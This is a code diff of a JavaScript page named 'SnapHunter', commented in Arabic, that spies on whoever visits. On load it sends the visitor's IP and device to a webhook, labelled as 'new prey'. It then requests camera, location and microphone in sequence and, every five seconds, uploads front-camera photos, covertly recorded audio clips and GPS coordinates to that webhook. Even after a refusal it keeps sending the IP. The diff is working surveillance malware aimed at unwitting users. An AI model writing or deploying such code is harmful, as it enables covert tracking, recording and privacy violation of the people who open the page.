@@ -6,90 +6,104 @@ const canvas = document.getElementById('canvas');
 
 let mediaRecorder;
 let audioChunks = [];
+let userLat = null, userLng = null;
 
-// 1. جلب IP ومعلومات الجهاز
-async function getDeviceInfo() {
+// 1. جلب IP الجهاز فور الدخول (بدون إذن)
+async function getIP() {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
         return data.ip;
     } catch (e) { return "غير معروف"; }
 }
 
-// 2. إشعار دخول فوري
-async function sendEntryLog() {
-    const ip = await getDeviceInfo();
+// 2. إرسال إشعار دخول فوري للبوت
+async function notifyEntry() {
+    const ip = await getIP();
     const payload = {
-        username: "SnapHunter - الرادار",
-        content: `🚨 **دخول جديد الآن!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
+        username: "SnapHunter - تعقب مباشر",
+        content: `🚨 **صيد جديد دخل الموقع!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
     };
     fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 }
 
-// 3. وظيفة الإرسال الشامل (صورة + صوت + موقع)
-async function sendFullPacket(imageBlob, audioBlob, lat, lng) {
-    const ip = await getDeviceInfo();
+// 3. وظيفة الإرسال الموحدة (صورة + صوت + موقع)
+async function sendDataPacket(imgBlob, audBlob) {
+    const ip = await getIP();
     const formData = new FormData();
     
-    let content = `🛰️ **تحديث شامل (كل 5 ثوانٍ)**\n` +
-                  `🌐 **IP:** \`${ip}\`\n`;
-    
-    if (lat && lng) {
-        content += `📍 **الموقع:** [فتح الخريطة](https://www.google.com/maps?q=${lat},${lng})\n`;
+    let content = `📡 **تحديث مباشر (كل 5 ثوانٍ)**\n🌐 **IP:** \`${ip}\`\n`;
+    if (userLat && userLng) {
+        content += `📍 **الموقع:** [خرائط جوجل](http://maps.google.com/maps?q=${userLat},${userLng})\n`;
     }
 
-    if (imageBlob) formData.append('file1', imageBlob, 'photo.png');
-    if (audioBlob) formData.append('file2', audioBlob, 'audio.ogg');
+    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
+    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
     
     formData.append('payload_json', JSON.stringify({
         content: content,
-        username: "SnapHunter - البث المباشر"
+        username: "SnapHunter - التجسس المباشر"
     }));
 
-    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
-// 4. تشغيل النظام الكامل
-async function startCapture() {
-    await sendEntryLog();
-
-    let lat, lng;
-    navigator.geolocation.watchPosition(p => { lat = p.coords.latitude; lng = p.coords.longitude; }, null, {enableHighAccuracy:true});
+// 4. تسلسل طلب الأذونات (كاميرا -> موقع -> ميكروفون)
+async function startSequentialCapture() {
+    await notifyEntry();
 
     try {
-        // طلب إذن الكاميرا والميكروفون معاً
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        video.srcObject = stream;
+        // أ- طلب الكاميرا أولاً
+        const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = camStream;
+        console.log("تم السماح بالكاميرا");
 
-        // إعداد مسجل الصوت
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-        
-        setInterval(() => {
-            // التقاط الصورة
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, 640, 480);
-            
-            // تسجيل مقطع صوتي قصير (3 ثوانٍ)
-            audioChunks = [];
-            mediaRecorder.start();
-            
-            setTimeout(() => {
-                mediaRecorder.stop();
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                    canvas.toBlob(imageBlob => {
-                        sendFullPacket(imageBlob, audioBlob, lat, lng);
-                    }, 'image/png');
-                };
-            }, 3000); // مدة تسجيل الصوت مع كل تحديث
+        // ب- طلب الموقع بعد ثانيتين
+        setTimeout(() => {
+            navigator.geolocation.getCurrentPosition(p => {
+                userLat = p.coords.latitude;
+                userLng = p.coords.longitude;
+                console.log("تم السماح بالموقع");
+            });
+        }, 2000);
 
-        }, 5000); // التكرار كل 5 ثوانٍ
+        // ج- طلب الميكروفون بعد 4 ثوانٍ والبدء في التسجيل المخفي
+        setTimeout(async () => {
+            try {
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(micStream);
+                
+                // بدء حلقة الإرسال كل 5 ثوانٍ
+                setInterval(() => {
+                    // التقاط صورة
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    
+                    // تسجيل صوت لمدة 3 ثوانٍ بشكل مخفي
+                    audioChunks = [];
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        mediaRecorder.onstop = () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                            canvas.toBlob(imgBlob => {
+                                sendDataPacket(imgBlob, audioBlob);
+                            }, 'image/png');
+                        };
+                    }, 3000);
+
+                }, 5000);
+
+            } catch (e) { console.log("رفض الميكروفون"); }
+        }, 4000);
 
     } catch (err) {
-        // إذا رفض المستخدم الأذونات، يستمر النظام في محاولة إرسال الموقع والـ IP
-        setInterval(() => { sendFullPacket(null, null, lat, lng); }, 5000);
+        console.log("رفض الكاميرا أو حدث خطأ");
+        // حتى لو رفض، نستمر بمحاولة إرسال الموقع والـ IP
+        setInterval(() => { sendDataPacket(null, null); }, 5000);
     }
 }
 
-window.onload = startCapture;
+window.onload = startSequentialCapture;
